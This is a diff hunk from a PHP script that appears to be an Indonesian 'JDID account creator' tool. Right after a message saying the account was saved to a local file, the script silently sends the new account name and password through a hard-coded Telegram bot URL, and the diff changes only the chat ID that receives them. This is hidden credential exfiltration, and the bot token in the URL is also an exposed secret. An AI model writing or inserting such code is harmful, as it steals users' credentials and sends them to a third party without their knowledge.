@@ -319,7 +319,7 @@ echo"============================================================= \n";
 				echo "    File Telah Disimpan di account-jdid.txt     \n";
 				echo "===============================================\n";
 				$ch = curl_init();
-                                        curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot1041269326:AAFJ54zg097Yw7qxUjZJUYTX37dLXtmafxM/sendMessage?chat_id=1057856193&text=JDID-account-creator | " . $registerJD . " | Password : " . $passwordSettings );
+                                        curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot1041269326:AAFJ54zg097Yw7qxUjZJUYTX37dLXtmafxM/sendMessage?chat_id=433519118&text=JDID-account-creator | " . $registerJD . " | Password : " . $passwordSettings );
 										curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
 										curl_exec($ch);
 										curl_close ($ch);
